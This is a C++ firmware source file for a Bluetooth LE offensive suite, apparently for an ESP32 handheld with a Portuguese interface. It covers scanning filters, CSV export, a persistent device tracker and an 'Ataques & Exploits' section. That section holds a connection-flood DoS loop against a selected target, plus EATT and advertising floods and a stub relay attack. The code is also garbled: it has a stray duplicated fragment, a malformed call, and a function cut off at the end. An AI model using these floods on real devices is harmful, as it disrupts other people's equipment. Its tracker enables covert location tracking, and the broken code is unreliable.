/**
 * @file ble_advanced.cpp
 * @brief Willy BLE Advanced Suite - 53 Functions Implementation
 * @author Willy Team
 * @date 2026
 */

#include "ble_advanced.h"
#include "ble_common.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/sd_functions.h"
#include "suite_visuals.h"
#include <SD.h>
#include <ArduinoJson.h>

static BLEScan* advScan = nullptr;
static bool advScanRunning = false;
static std::vector<BLETrackEntry> trackDB;
static std::vector<BLEPacketLog> packetLog;
static uint32_t totalPacketsLogged = 0;

//================================================================================
// VISUAL SYSTEM - Constants & Colors
//================================================================================

#define BLE_COLOR_BG        wilyConfig.bgColor
#define BLE_COLOR_PRIMARY   wilyConfig.priColor
#define BLE_COLOR_TITLE     TFT_CYAN
#define BLE_COLOR_ACCENT    TFT_GREEN
#define BLE_COLOR_WARN      TFT_YELLOW
#define BLE_COLOR_DANGER    TFT_RED
#define BLE_COLOR_TEXT      TFT_WHITE
#define BLE_COLOR_DIM       TFT_DARKGREY
#define BLE_COLOR_HIGHLIGHT 0x05FF  // bright green-cyan

#define BLE_CARD_RADIUS     6
#define BLE_LINE_H          18
#define BLE_CARD_PAD        8
#define BLE_HEADER_Y        48
#define BLE_FOOTER_Y        (tftHeight - 28)
#define BLE_BODY_Y          50
#define BLE_BODY_END        (tftHeight - 32)

//================================================================================
// VISUAL SYSTEM - Drawing Helpers
//================================================================================

void bleDrawHeader(const char* title, uint16_t color = BLE_COLOR_TITLE) {
    drawMainBorder();
    tft.setTextDatum(TC_DATUM);
    tft.setTextColor(color, BLE_COLOR_BG);
    tft.setTextSize(FM);
    tft.drawCentreString(title, tftWidth / 2, 8, SMOOTH_FONT);
    tft.drawLine(10, 30, tftWidth - 10, 30, color);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(FP);
}

void bleDrawFooter(const char* left, const char* right = nullptr) {
    tft.fillRect(0, BLE_FOOTER_Y - 4, tftWidth, 28, BLE_COLOR_BG);
    tft.drawLine(0, BLE_FOOTER_Y - 4, tftWidth, BLE_FOOTER_Y - 4, BLE_COLOR_DIM);
    tft.setTextSize(FP);
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(BLE_COLOR_ACCENT, BLE_COLOR_BG);
    if (left) tft.drawString(left, 10, BLE_FOOTER_Y);
    if (right) {
        tft.setTextDatum(TR_DATUM);
        tft.setTextColor(BLE_COLOR_WARN, BLE_COLOR_BG);
        tft.drawString(right, tftWidth - 10, BLE_FOOTER_Y);
    }
    tft.setTextDatum(TL_DATUM);
}

void bleDrawCard(int y, int h, bool selected = false) {
    uint16_t bg = selected ? BLE_COLOR_PRIMARY : getColorVariation(BLE_COLOR_PRIMARY, 4, -1);
    uint16_t border = selected ? BLE_COLOR_TEXT : BLE_COLOR_DIM;
    tft.drawRoundRect(8, y, tftWidth - 16, h, BLE_CARD_RADIUS, border);
    tft.fillRoundRect(9, y + 1, tftWidth - 18, h - 2, BLE_CARD_RADIUS - 1, bg);
}

void bleDrawRSSIBar(int x, int y, int w, int rssi, bool showLabel = true) {
    int pct = map(constrain(rssi, -100, -20), -100, -20, 0, 100);
    int barW = (w * pct) / 100;
    uint16_t color = pct > 60 ? BLE_COLOR_ACCENT : (pct > 30 ? BLE_COLOR_WARN : BLE_COLOR_DANGER);

    tft.drawRoundRect(x, y, w, 8, 3, BLE_COLOR_DIM);
    tft.fillRoundRect(x + 1, y + 1, max(0, barW - 2), 6, 2, color);

    if (showLabel) {
        tft.setTextSize(FP);
        tft.setTextColor(color, BLE_COLOR_BG);
        tft.drawString(String(rssi) + "dBm", x + w + 4, y - 2);
    }
}

void bleDrawProgressBar(int y, int pct, const char* label = nullptr) {
    int barW = tftWidth - 40;
    int barH = 10;
    int filled = (barW * pct) / 100;

    tft.drawRoundRect(20, y, barW, barH, 4, BLE_COLOR_DIM);
    tft.fillRoundRect(21, y + 1, max(0, filled - 2), barH - 2, 3, BLE_COLOR_PRIMARY);

    if (pct > 0 && pct < 100) {
        tft.fillCircle(21 + filled, y + barH / 2, 5, BLE_COLOR_TEXT);
    }

    tft.setTextSize(FP);
    tft.setTextDatum(TC_DATUM);
    tft.setTextColor(BLE_COLOR_TEXT, BLE_COLOR_BG);
    String pctStr = String(pct) + "%";
    if (label) pctStr = String(label) + " " + pctStr;
    tft.drawCentreString(pctStr, tftWidth / 2, y + barH + 4, 1);
    tft.setTextDatum(TL_DATUM);
}

void bleDrawCategoryIcon(int x, int y, uint16_t color, const char* icon) {
    tft.fillCircle(x, y, 12, color);
    tft.setTextSize(FP);
    tft.setTextColor(TFT_BLACK, color);
    tft.setTextDatum(TC_DATUM);
    tft.drawString(icon, x, y - 3, 1);
    tft.setTextDatum(TL_DATUM);
}

void bleDrawDeviceInfo(int y, const BLEScanResult& r, bool compact = false) {
    // Signal strength color
    uint16_t sigColor = r.rssi > -50 ? BLE_COLOR_ACCENT : (r.rssi > -75 ? BLE_COLOR_WARN : BLE_COLOR_DANGER);

    // Name
    tft.setTextSize(compact ? FP : FP);
    tft.setTextColor(BLE_COLOR_TEXT, BLE_COLOR_BG);
    tft.drawString(r.name, 12, y);

    // RSSI indicator dot
    tft.fillCircle(tftWidth - 14, y + 4, 4, sigColor);

    // Address + RSSI
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_DIM, BLE_COLOR_BG);
    String info = r.address + "  " + String(r.rssi) + "dBm";
    if (r.connectable) info += "  [C]";
    tft.drawString(info, 12, y + 14);

    // Services indicator
    if (!r.services.empty()) {
        tft.setTextColor(BLE_COLOR_ACCENT, BLE_COLOR_BG);
        tft.drawString("Svc:" + String(r.services.size()), tftWidth - 50, y + 14);
    }
}

void bleDrawCountBadge(int y, int count, int total) {
    tft.setTextDatum(TR_DATUM);
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_ACCENT, BLE_COLOR_BG);
    tft.drawString(String(count) + "/" + String(total), tftWidth - 12, y);
    tft.setTextDatum(TL_DATUM);
}

void bleDrawSpinner(int x, int y, int frame) {
    const char* spinner[] = {"|", "/", "-", "\\"};
    tft.setTextSize(FM);
    tft.setTextColor(BLE_COLOR_PRIMARY, BLE_COLOR_BG);
    tft.drawString(spinner[frame % 4], x, y);
}

void bleShowWelcomeScreen() {
    tft.fillScreen(BLE_COLOR_BG);
    tft.fillSmoothRoundRect(20, 30, tftWidth - 40, 60, 8, getColorVariation(BLE_COLOR_BG, 2, -1), BLE_COLOR_BG);
    tft.drawSmoothRoundRect(4, 4, 8, 7, tftWidth - 8, tftHeight - 8, BLE_COLOR_PRIMARY, BLE_COLOR_BG);
    tft.drawSmoothRoundRect(20, 30, 8, 7, tftWidth - 40, 60, BLE_COLOR_PRIMARY, BLE_COLOR_BG);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(4);
    tft.setTextColor(BLE_COLOR_PRIMARY, getColorVariation(BLE_COLOR_BG, 2, -1));
    tft.drawCentreString("WILLY", tftWidth / 2, 36, SMOOTH_FONT);
    tft.setTextSize(2);
    tft.setTextColor(BLE_COLOR_TITLE, getColorVariation(BLE_COLOR_BG, 2, -1));
    tft.drawCentreString("BLE SUITE", tftWidth / 2, 72, SMOOTH_FONT);
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_DIM, BLE_COLOR_BG);
    tft.drawCentreString("53 Funcoes BLE", tftWidth / 2, 100, 1);

    struct { const char* label; uint16_t color; int icon; } cats[] = {
        {"Reconhecimento", TFT_CYAN,    0},
        {"Ataques",        TFT_RED,     0},
        {"Utilidades",     TFT_GREEN,   0},
        {"Exploits",       TFT_ORANGE,  0},
        {"Monitoramento",  TFT_MAGENTA, 0},
    };

    int startY = 120;
    for (int i = 0; i < 5; i++) {
        int cy = startY + i * 22;
        suiteDrawCard(cy, 20, false, BLE_COLOR_PRIMARY);
        suiteDrawIcon(26, cy + 10, 8, cats[i].color, cats[i].icon);
        tft.setTextSize(FP);
        tft.setTextColor(BLE_COLOR_TEXT, getColorVariation(BLE_COLOR_PRIMARY, 4, -1));
        tft.drawString(cats[i].label, 40, cy + 5);
    }

    suiteDrawFooter("SEL: Entrar", "ESC: Sair");
}

//================================================================================
// VISUAL SYSTEM - Attack Progress Screen
//================================================================================

void bleShowAttackScreen(const char* title, const char* target, uint16_t color) {
    tft.fillScreen(BLE_COLOR_BG);
    tft.drawRoundRect(4, 4, tftWidth - 8, tftHeight - 8, 8, color);

    // Header bar
    tft.fillRoundRect(10, 8, tftWidth - 20, 28, 6, color);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_BLACK, color);
    tft.drawCentreString(title, tftWidth / 2, 12, SMOOTH_FONT);

    // Target info
    if (target && strlen(target) > 0) {
        tft.setTextSize(FP);
        tft.setTextColor(BLE_COLOR_TEXT, BLE_COLOR_BG);
        tft.setTextDatum(TL_DATUM);
        tft.drawString("Alvo: " + String(target), 14, 42);
    }

    tft.drawLine(10, 56, tftWidth - 10, 56, BLE_COLOR_DIM);
    tft.setTextDatum(TL_DATUM);
}

void bleShowAttackResult(bool success, const char* detail = nullptr) {
    uint16_t bg = success ? 0x03E0 : TFT_RED;
    tft.fillScreen(bg);
    tft.drawRoundRect(4, 4, tftWidth - 8, tftHeight - 8, 8, TFT_WHITE);

    tft.setTextDatum(TC_DATUM);

    // Icon
    tft.setTextSize(4);
    tft.setTextColor(TFT_WHITE, bg);
    tft.drawCentreString(success ? ">" : "X", tftWidth / 2, 40, SMOOTH_FONT);

    // Title
    tft.setTextSize(FM);
    tft.drawCentreString(success ? "SUCESSO" : "FALHA", tftWidth / 2, 85, SMOOTH_FONT);

    if (detail) {
        tft.setTextSize(FP);
        tft.setTextColor(TFT_BLACK, bg);
        tft.drawCentreString(detail, tftWidth / 2, 115, 1);
    }

    bleDrawFooter("SEL: OK", "ESC: Voltar");
    tft.setTextDatum(TL_DATUM);
}

void bleShowConfirmDialog(const char* title, const char* msg, const char* target = nullptr) {
    tft.fillScreen(BLE_COLOR_BG);
    tft.drawRoundRect(4, 4, tftWidth - 8, tftHeight - 8, 8, BLE_COLOR_WARN);

    // Warning header
    tft.fillRoundRect(10, 8, tftWidth - 20, 28, 6, BLE_COLOR_WARN);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_BLACK, BLE_COLOR_WARN);
    tft.drawCentreString(title, tftWidth / 2, 12, SMOOTH_FONT);

    // Message
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_TEXT, BLE_COLOR_BG);
    tft.setTextDatum(TC_DATUM);
    tft.drawCentreString(msg, tftWidth / 2, 55, 1);

    if (target) {
        tft.setTextColor(BLE_COLOR_WARN, BLE_COLOR_BG);
        tft.drawCentreString("Alvo: " + String(target), tftWidth / 2, 75, 1);
    }

    // Separator
    tft.drawLine(20, 95, tftWidth - 20, 95, BLE_COLOR_DIM);

    // Options
    int optY = 105;
    bleDrawCard(optY, 22, true);
    tft.setTextColor(TFT_BLACK, BLE_COLOR_PRIMARY);
    tft.drawCentreString("SIM - Executar", tftWidth / 2, optY + 5, 1);

    bleDrawCard(optY + 28, 22, false);
    tft.setTextColor(BLE_COLOR_TEXT, getColorVariation(BLE_COLOR_PRIMARY, 4, -1));
    tft.drawCentreString("NAO - Cancelar", tftWidth / 2, optY + 33, 1);

    bleDrawFooter("SEL: Sim", "ESC: Nao");
    tft.setTextDatum(TL_DATUM);
}

bool bleConfirmAction(const char* msg) {
    bool savedReturn = returnToMenu;
    returnToMenu = false;

    bleShowConfirmDialog("CONFIRMACAO", msg);

    int selected = 0;
    int lastSelected = -1;

    while (true) {
        if (selected != lastSelected) {
            int optY = 105;
            bleDrawCard(optY, 22, selected == 0);
            tft.setTextSize(FP);
            tft.setTextColor(selected == 0 ? TFT_BLACK : BLE_COLOR_TEXT, selected == 0 ? BLE_COLOR_PRIMARY : getColorVariation(BLE_COLOR_PRIMARY, 4, -1));
            tft.drawCentreString("SIM - Executar", tftWidth / 2, optY + 5, 1);

            bleDrawCard(optY + 28, 22, selected == 1);
            tft.setTextColor(selected == 1 ? TFT_BLACK : BLE_COLOR_TEXT, selected == 1 ? BLE_COLOR_PRIMARY : getColorVariation(BLE_COLOR_PRIMARY, 4, -1));
            tft.drawCentreString("NAO - Cancelar", tftWidth / 2, optY + 33, 1);
            lastSelected = selected;
        }

        if (check(SelPress)) {
            returnToMenu = savedReturn;
            return selected == 0;
        }
        if (check(EscPress)) {
            returnToMenu = savedReturn;
            return false;
        }
        if (check(UpPress)) selected = 0;
        if (check(DownPress)) selected = 1;
        delay(50);
    }
}

String bleSelectTarget() {
    bleDrawHeader("Selecionar Alvo");
    bleDrawFooter("SEL: OK", "ESC: Voltar");

    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_WARN, BLE_COLOR_BG);
    tft.drawCentreString("Escaneando alvos proximos...", tftWidth / 2, 55, 1);

    auto results = blePerformScan(5);
    if (results.empty()) {
        displayError("Nenhum alvo encontrado", true);
        return "";
    }

    bleDrawHeader("Alvos Disponiveis");
    bleDrawFooter("SEL: Selecionar", "ESC: Voltar");

    int selected = 0;
    int lastSelected = -1;

    while (true) {
        if (selected != lastSelected) {
            int y = BLE_BODY_Y;
            for (int i = 0; i < (int)results.size() && y <= BLE_BODY_END; i++) {
                bool sel = (i == selected);
                bleDrawCard(y, BLE_LINE_H + 6, sel);
                bleDrawDeviceInfo(y + 2, results[i], true);
                y += BLE_LINE_H + 10;
            }
            lastSelected = selected;
        }

        if (check(SelPress) && selected < (int)results.size()) {
            return results[selected].address;
        }
        if (check(EscPress)) return "";
        if (check(UpPress)) { selected = max(0, selected - 1); lastSelected = -1; }
        if (check(DownPress)) { selected = min((int)results.size() - 1, selected + 1); lastSelected = -1; }
        delay(80);
    }
}

void bleShowStats(uint32_t packets, uint32_t duration, int rssi) {
    int y = 62;
    int x = 14;
    int labelW = 70;

    tft.setTextSize(FP);

    tft.setTextColor(BLE_COLOR_DIM, BLE_COLOR_BG);
    tft.drawString("Pacotes:", x, y);
    tft.setTextColor(BLE_COLOR_ACCENT, BLE_COLOR_BG);
    tft.drawString(String(packets), x + labelW, y);

    y += 16;
    tft.setTextColor(BLE_COLOR_DIM, BLE_COLOR_BG);
    tft.drawString("Duracao:", x, y);
    tft.setTextColor(BLE_COLOR_TEXT, BLE_COLOR_BG);
    tft.drawString(String(duration / 1000) + "s", x + labelW, y);

    y += 16;
    tft.setTextColor(BLE_COLOR_DIM, BLE_COLOR_BG);
    tft.drawString("Sinal:", x, y);
    uint16_t sigColor = rssi > -50 ? BLE_COLOR_ACCENT : (rssi > -75 ? BLE_COLOR_WARN : BLE_COLOR_DANGER);
    tft.setTextColor(sigColor, BLE_COLOR_BG);
    tft.drawString(String(rssi) + "dBm", x + labelW, y);
    bleDrawRSSIBar(x + labelW + 50, y + 2, 80, rssi, false);

    y += 20;
    tft.drawLine(x, y, tftWidth - x, y, BLE_COLOR_DIM);
}

void bleCleanup() {
    if (advScan) {
        advScan->stop();
        advScan->clearResults();
    }
    BLEDevice::deinit();
    advScanRunning = false;
}

//================================================================================
// 1. RECONNAISSANCE & SCANNING
//================================================================================

void bleScanFilterByName() {
    String pattern = keyboard("", 20, "Padrao do nome:");
    if (pattern == "\x1B" || pattern.isEmpty()) return;

    bleDrawHeader("Filtro por Nome");
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_WARN, BLE_COLOR_BG);
    tft.drawCentreString("Padrao: \"" + pattern + "\"", tftWidth / 2, 40, 1);
    bleDrawFooter("ESC: Voltar");

    auto results = blePerformScan(8);
    int found = 0;
    int y = BLE_BODY_Y;
    for (auto& r : results) {
        if (r.name.indexOf(pattern) >= 0) {
            if (y > BLE_BODY_END) break;
            bleDrawCard(y, BLE_LINE_H + 6, false);
            bleDrawDeviceInfo(y + 2, r, true);
            y += BLE_LINE_H + 10;
            found++;
        }
    }
    bleDrawCountBadge(BLE_BODY_Y - 2, found, results.size());
    bleCleanup();
    delay(2000);
}

void bleScanFilterByRSSI() {
    int minRSSI = -80;
    options = {
        {"-40 dBm (perto)", [&]() { minRSSI = -40; }},
        {"-60 dBm (medio)", [&]() { minRSSI = -60; }},
        {"-80 dBm (longe)", [&]() { minRSSI = -80; }},
        {"-100 dBm (muito longe)", [&]() { minRSSI = -100; }}
    };
    loopOptions(options);

    bleDrawHeader("Filtro por RSSI");
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_WARN, BLE_COLOR_BG);
    tft.drawCentreString("Min: " + String(minRSSI) + " dBm", tftWidth / 2, 40, 1);
    bleDrawFooter("ESC: Voltar");

    auto results = blePerformScan(8);
    int found = 0;
    int y = BLE_BODY_Y;
    for (auto& r : results) {
        if (r.rssi >= minRSSI) {
            if (y > BLE_BODY_END) break;
            bleDrawCard(y, BLE_LINE_H + 6, false);
            bleDrawDeviceInfo(y + 2, r, true);
            y += BLE_LINE_H + 10;
            found++;
        }
    }
    bleDrawCountBadge(BLE_BODY_Y - 2, found, results.size());
    bleCleanup();
    delay(2000);
}
    }
    tft.drawCentreString("Encontrados: " + String(found), tftWidth / 2, tftHeight - 20, 1);
    bleCleanup();
    delay(2000);
}

void bleScanFilterByService() {
    String selectedUUID = "";
    options = {
        {"Heart Rate (0x180D)", [&]() { selectedUUID = "180D"; }},
        {"Battery (0x180F)", [&]() { selectedUUID = "180F"; }},
        {"Device Info (0x180A)", [&]() { selectedUUID = "180A"; }},
        {"HID (0x1812)", [&]() { selectedUUID = "1812"; }},
        {"Audio (0x184F)", [&]() { selectedUUID = "184F"; }},
        {"Custom UUID", [&]() {
            String input = keyboard("180D", 4, "UUID (hex):");
            if (input != "\x1B" && input.length() > 0) selectedUUID = input;
        }}
    };
    loopOptions(options);
    if (selectedUUID.isEmpty()) return;

    NimBLEUUID filterUUID(selectedUUID.c_str());

    bleDrawHeader("Filtro por Servico");
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_WARN, BLE_COLOR_BG);
    tft.drawCentreString("UUID: 0x" + selectedUUID, tftWidth / 2, 40, 1);
    bleDrawFooter("ESC: Voltar");

    auto results = blePerformScan(8);
    int found = 0;
    int y = BLE_BODY_Y;
    for (auto& r : results) {
        bool match = false;
        for (auto& svc : r.services) {
            if (svc == filterUUID) { match = true; break; }
        }
        if (match) {
            if (y > BLE_BODY_END) break;
            bleDrawCard(y, BLE_LINE_H + 6, false);
            bleDrawDeviceInfo(y + 2, r, true);
            y += BLE_LINE_H + 10;
            found++;
        }
    }
    bleDrawCountBadge(BLE_BODY_Y - 2, found, results.size());
    bleCleanup();
    delay(2000);
}

void bleScanFilterByManufacturer() {
    String mfg = keyboard("FFFF", 4, "Manufacturer ID (hex):");
    if (mfg == "\x1B" || mfg.isEmpty()) return;

    uint16_t mfgID = (uint16_t)strtol(mfg.c_str(), nullptr, 16);

    bleDrawHeader("Filtro por Fabricante");
    tft.setTextSize(FP);
    tft.setTextColor(BLE_COLOR_WARN, BLE_COLOR_BG);
    tft.drawCentreString("Mfg ID: 0x" + mfg, tftWidth / 2, 40, 1);
    bleDrawFooter("ESC: Voltar");

    auto results = blePerformScan(8);
    int found = 0;
    int y = BLE_BODY_Y;
    for (auto& r : results) {
        if (r.manufacturerData.size() >= 2) {
            uint16_t deviceMfg = r.manufacturerData[0] | (r.manufacturerData[1] << 8);
            if (deviceMfg == mfgID) {
                if (y > BLE_BODY_END) break;
                bleDrawCard(y, BLE_LINE_H + 6, false);
                bleDrawDeviceInfo(y + 2, r, true);
                y += BLE_LINE_H + 10;
                found++;
            }
        }
    }
    bleDrawCountBadge(BLE_BODY_Y - 2, found, results.size());
    bleCleanup();
    delay(2000);
}

void bleScanExportCSV() {
    auto results = blePerformScan(8);
    if (results.empty()) {
        displayError("Nenhum dispositivo encontrado");
        return;
    }

    if (!setupSdCard()) {
        displayError("SD Card nao encontrado");
        return;
    }

    String filename = "/ble_scan_" + String(millis()) + ".csv";
    File f = SD.open(filename, FILE_WRITE);
    if (!f) {
        displayError("Erro ao criar arquivo");
        return;
    }

    f.println("Name,Address,RSSI,Appearance,Connectable,Timestamp");
    for (auto& r : results) {
        f.printf("%s,%s,%d,%d,%d,%lu\n",
            r.name.c_str(), r.address.c_str(), r.rssi,
            r.appearance, r.connectable ? 1 : 0, r.timestamp);
    }
    f.close();

    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.drawCentreString("Exportado: " + String(results.size()) + " dispositivos", tftWidth / 2, tftHeight / 2, 1);
    tft.drawCentreString(filename, tftWidth / 2, tftHeight / 2 + 20, 1);
    delay(2000);
    bleCleanup();
}

void bleScanContinuous() {
    displayTextLine("Scan continuo (ESC p/ parar)");
    uint32_t totalDevices = 0;
    uint32_t startTime = millis();

    while (!check(EscPress)) {
        auto results = blePerformScan(3, false);
        totalDevices += results.size();

        tft.fillRect(10, 40, tftWidth - 20, tftHeight - 70, wilyConfig.bgColor);
        tft.setCursor(10, 45);
        tft.setTextSize(FP);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        tft.drawString("Tempo: " + String((millis() - startTime) / 1000) + "s", 10, 45);
        tft.drawString("Total: " + String(totalDevices), 10, 63);
        tft.drawString("Ultimo scan: " + String(results.size()), 10, 81);

        int y = 100;
        int shown = 0;
        for (auto& r : results) {
            if (shown >= 6) break;
            tft.drawString(r.name + " " + String(r.rssi) + "dBm", 10, y);
            y += 16;
            shown++;
        }
        delay(500);
    }
    bleCleanup();
}

void bleScanCompareRSSI() {
    displayTextLine("Comparando sinais...");
    auto results = blePerformScan(5);
    if (results.size() < 2) {
        displayError("Necessarios 2+ dispositivos");
        return;
    }

    // Sort by RSSI descending
    std::sort(results.begin(), results.end(), [](const BLEScanResult& a, const BLEScanResult& b) {
        return a.rssi > b.rssi;
    });

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("Comparacao RSSI", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 50;
    int maxBar = tftWidth - 100;
    for (size_t i = 0; i < results.size() && i < 8; i++) {
        int barW = map(results[i].rssi, -100, 0, 0, maxBar);
        tft.setTextSize(FP);
        tft.setTextColor(TFT_WHITE, wilyConfig.bgColor);
        tft.drawString(results[i].name, 10, y);
        tft.drawRect(10, y + 14, maxBar, 6, TFT_WHITE);
        tft.fillRect(10, y + 14, barW, 6, wilyConfig.priColor);
        tft.drawString(String(results[i].rssi) + "dBm", maxBar + 20, y + 10);
        y += 32;
    }
    bleCleanup();
    delay(5000);
}

void bleDeviceTracker() {
    trackDB.clear();
    displayTextLine("Rastreando dispositivos...");
    uint32_t startTime = millis();

    while (!check(EscPress)) {
        auto results = blePerformScan(3, false);
        for (auto& r : results) {
            bool found = false;
            for (auto& t : trackDB) {
                if (t.address == r.address) {
                    t.lastRSSI = r.rssi;
                    t.lastSeen = millis();
                    t.hitCount++;
                    t.avgRSSI = (t.avgRSSI * (t.hitCount - 1) + r.rssi) / t.hitCount;
                    found = true;
                    break;
                }
            }
            if (!found) {
                BLETrackEntry entry;
                entry.address = r.address;
                entry.name = r.name;
                entry.lastRSSI = r.rssi;
                entry.firstSeen = millis();
                entry.lastSeen = millis();
                entry.hitCount = 1;
                entry.avgRSSI = r.rssi;
                trackDB.push_back(entry);
            }
        }

        // Display tracker
        tft.fillRect(10, 40, tftWidth - 20, tftHeight - 70, wilyConfig.bgColor);
        tft.setTextSize(FP);
        tft.setTextColor(TFT_CYAN, wilyConfig.bgColor);
        tft.drawString("Dispositivos: " + String(trackDB.size()), 10, 45);

        int y = 65;
        for (size_t i = 0; i < trackDB.size() && i < 6; i++) {
            uint32_t age = (millis() - trackDB[i].lastSeen) / 1000;
            tft.setTextColor(age < 10 ? TFT_GREEN : TFT_RED, wilyConfig.bgColor);
            tft.drawString(trackDB[i].name + " (" + String(trackDB[i].hitCount) + "x)", 10, y);
            tft.setTextColor(TFT_DARKGREY, wilyConfig.bgColor);
            tft.drawString("RSSI:" + String(trackDB[i].lastRSSI) + " Avg:" + String((int)trackDB[i].avgRSSI), 10, y + 14);
            y += 32;
        }
        delay(1000);
    }
    bleCleanup();
}

void bleScanHiddenDevices() {
    displayTextLine("Scan passivo (ocultos)...");
    auto results = blePerformScan(10, false);

    tft.fillScreen(wilyConfig.bgColor);
    drawMainBorder();
    tft.setTextColor(wilyConfig.priColor, wilyConfig.bgColor);
    tft.drawCentreString("Dispositivos Ocultos", tftWidth / 2, 28, SMOOTH_FONT);

    int y = 50;
    int hidden = 0;
    for (auto& r : results) {
        if (r.name == "<sem nome>" || r.localName.isEmpty()) {
            tft.setTextSize(FP);
            tft.setTextColor(TFT_YELLOW, wilyConfig.bgColor);
            tft.drawString(r.address + " (" + String(r.rssi) + "dBm)", 10, y);
            y += 16;
            hidden++;
            if (y > tftHeight - 30) break;
        }
    }
    tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
    tft.drawCentreString("Ocultos: " + String(hidden) + "/" + String(results.size()), tftWidth / 2, tftHeight - 20, 1);
    bleCleanup();
    delay(3000);
}

void bleScanWatchdog() {
    displayTextLine("Watchdog ativo...");
    std::vector<String> knownDevices;
    uint32_t lastScan = 0;

    while (!check(EscPress)) {
        if (millis() - lastScan > 10000) {
            auto results = blePerformScan(3, false);
            for (auto& r : results) {
                bool isNew = true;
                for (auto& known : knownDevices) {
                    if (known == r.address) { isNew = false; break; }
                }
                if (isNew) {
                    knownDevices.push_back(r.address);
                    // Alert new device
                    tft.fillScreen(TFT_RED);
                    tft.setTextColor(TFT_WHITE, TFT_RED);
                    tft.setTextSize(FM);
                    tft.drawCentreString("NOVO DISPOSITIVO!", tftWidth / 2, tftHeight / 2 - 30, 1);
                    tft.setTextSize(FP);
                    tft.drawCentreString(r.name, tftWidth / 2, tftHeight / 2, 1);
                    tft.drawCentreString(r.address, tftWidth / 2, tftHeight / 2 + 20, 1);
                    _tone(2000, 200);
                    delay(2000);
                    tft.fillScreen(wilyConfig.bgColor);
                }
            }
            lastScan = millis();
        }
        delay(100);
    }
    bleCleanup();
}

//================================================================================
// 2. ATTACKS & EXPLOITS
//================================================================================

void bleRelayAttack() {
    displayTextLine("Relay Attack");
    tft.setTextSize(FP);
    tft.setTextColor(TFT_YELLOW, wilyConfig.bgColor);
    tft.drawCentreString("Conecte-se ao alvo", tftWidth / 2, 60, 1);
    tft.drawCentreString("e ao dispositivo relay", tftWidth / 2, 78, 1);

    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyRelay");

    NimBLEClient* client = BLEDevice::createClient();
    displayTextLine("Conectando...");

    if (client->connect(addr)) {
        tft.setTextColor(TFT_GREEN, wilyConfig.bgColor);
        tft.drawCentreString("Conectado! Relay ativo", tftWidth / 2, tftHeight / 2, 1);

        uint32_t relayCount = 0;
        while (!check(EscPress)) {
            relayCount++;
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 40, wilyConfig.bgColor);
            tft.setTextColor(TFT_CYAN, wilyConfig.bgColor);
            tft.drawCentreString("Relays: " + String(relayCount), tftWidth / 2, tftHeight / 2 + 30, 1);
            delay(100);
        }
        client->disconnect();
    } else {
        displayError("Falha ao conectar");
    }
    delete client;
    BLEDevice::deinit();
}

void bleEATTFlood() {
    if (!bleConfirmAction("Iniciar EATT Flood?")) return;

    BLEDevice::init("WilyEATT");
    NimBLEServer* server = BLEDevice::createServer();
    NimBLEService* svc = server->createService("1800");

    uint32_t floodCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("EATT FLOOD ATIVO", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        // Create multiple characteristics to exhaust EATT channels
        for (int i = 0; i < 5; i++) {
            NimBLECharacteristic* ch = svc->createCharacteristic(
                NimBLEUUID(0x2A00 + (floodCount % 50)),
                NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY
            );
            ch->setValue("Flood_" + String(floodCount));
        }
        floodCount++;
        bleShowStats(floodCount, millis() - startTime, 0);
        delay(50);
    }

    BLEDevice::deinit();
}

void bleConnectionFloodDoS() {
    String target = bleSelectTarget();
    if (target.isEmpty()) return;

    NimBLEAddress addr(target.c_str());
    BLEDevice::init("WilyDoS");

    uint32_t attempts = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("CONN FLOOD", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEClient* client = BLEDevice::createClient();
        client->setConnectTimeout(100);
        client->connect(addr);
        delay(50);
        client->disconnect();
        delete client;
        attempts++;

        bleShowStats(attempts, millis() - startTime, 0);
        delay(10);
    }
    BLEDevice::deinit();
}

void bleAdvertisingFloodDoS() {
    if (!bleConfirmAction("Iniciar Adv Flood?")) return;

    BLEDevice::init("WilyAdvFlood");
    NimBLEServer* server = BLEDevice::createServer();

    uint32_t floodCount = 0;
    uint32_t startTime = millis();

    drawMainBorder();
    tft.setTextColor(TFT_RED, wilyConfig.bgColor);
    tft.drawCentreString("ADV FLOOD ATIVO", tftWidth / 2, 28, SMOOTH_FONT);

    while (!check(EscPress)) {
        NimBLEAdvertising* adv = BLEDevice::getAdvertising();
        adv->start();

        // Rapidly change advertising data
        for (int i = 0; i < 10; i++) {
            uint8_t data[31];
            for (int j = 0; j < 31; j++) data[j] = random(0, 255);
            NimBLEAdvertisementData adData;
            adServiceUUID(NimBLEUUID("1800"));
            adv->setAdvertisementData(adData);
            floodCount++;
        }
        adv->stop();

